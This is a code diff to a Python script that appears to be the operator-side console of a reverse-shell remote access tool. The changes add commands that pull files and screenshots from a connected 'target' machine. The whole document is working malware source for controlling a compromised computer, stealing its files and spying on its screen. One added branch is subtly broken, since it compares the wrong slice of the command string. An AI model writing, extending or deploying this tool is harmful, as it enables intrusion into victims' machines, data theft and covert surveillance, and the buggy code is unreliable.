@@ -2,7 +2,7 @@ import socket
 from termcolor import colored
 import json
 import os
-
+import pyautogui
 
 def receive():
     data = ''
@@ -24,7 +24,22 @@ def upload_file(file_name):
     target.send(file.read())
 
 
+def download_file(file_name):
+    file = open(file_name, 'wb')
+    target.settimeout(1)
+    chunk = target.recv(1024)
+    while chunk:
+        file.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    file.close()
+
+
 def target_communication():
+    count = 0
     while True:
         command = input(f'Shell@{ip}: ')
         send(command)
@@ -36,6 +51,21 @@ def target_communication():
             pass
         elif command[:6] == 'upload':
             upload_file(command[7:])
+        elif command[8:] == 'download':
+            download_file(command[9:])
+        elif command[:10] == 'screenshot':
+                file = open(f'screenshot{count}', 'wb')
+                target.settimeout(3)
+                chunk = target.recv(1024)
+                while chunk:
+                    file.write(chunk)
+                    try:
+                        chunk = target.recv(1024)
+                    except socket.timeout as e:
+                        break
+                target.settimeout(None)
+                file.close()
+                count += 1
         elif command == 'help':
             print(colored('''\n
             quit                                --> Quit Session With The Target
